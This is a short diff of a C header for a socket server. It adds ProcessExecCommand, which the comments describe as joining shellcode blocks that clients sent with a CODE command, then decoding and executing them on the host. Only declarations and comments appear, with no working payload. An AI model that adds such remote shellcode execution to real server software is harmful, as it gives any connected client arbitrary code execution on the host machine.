@@ -94,8 +94,7 @@ BOOL IsMultilineResponseTerminator(void* pvUserState /*not used*/,
  * client threads that are no longer needed for communications.
  * @param pClientStruct Address of an instance of CLIENTSTRUCT containing
  * information about the thread that is being used to communicate with the
- * client at the current element in the list.
- */
+ * client at the current element in the list. */
 void KillClientThread(void* pClientStruct);
 
 /**
@@ -127,11 +126,26 @@ void ProcessCodeCommand(LPCLIENTSTRUCT lpSendingClient,
     const char* pszBuffer);
 
 /**
+ * @name ProcessExecCommand
+ * @brief Processes the server's behavior upon receiving the EXEC command.
+ * @param lpSendingClient Pointer to an instance of CLIENTSTRUCT that refers
+ * to the client who sent the command.
+ * @remarks This function instructs the server to obtain shellcode blocks
+ * already previously transmitted with the CODE command, "marry" them
+ * together, and then decode and execute the shellcode on the host
+ * operating system.  The results of this function, therefore, cannot be
+ * guaranteed and may even lead to the crash of the server and/or the host
+ * machine (depending on what the shellcode instructs the host machine to
+ * do.)
+ */
+void ProcessExecCommand(LPCLIENTSTRUCT lpSendingClient);
+
+/**
  * @brief Processes the server's behavior upon receiveing the HELO comamnd.
  * @param lpSendingClient Pointer to an instance of CLIENTSTRUCT that refers
  * to the client who sent the command.
- * @remarks This function marks the client as being ready to receive chats, and
- * then replies to the client per the protocol.
+ * @remarks This function marks the client as being ready to receive any other
+ * commands from the specific client who just said HELO ("Hello!").
  */
 void ProcessHeloCommand(LPCLIENTSTRUCT lpSendingClient);
 
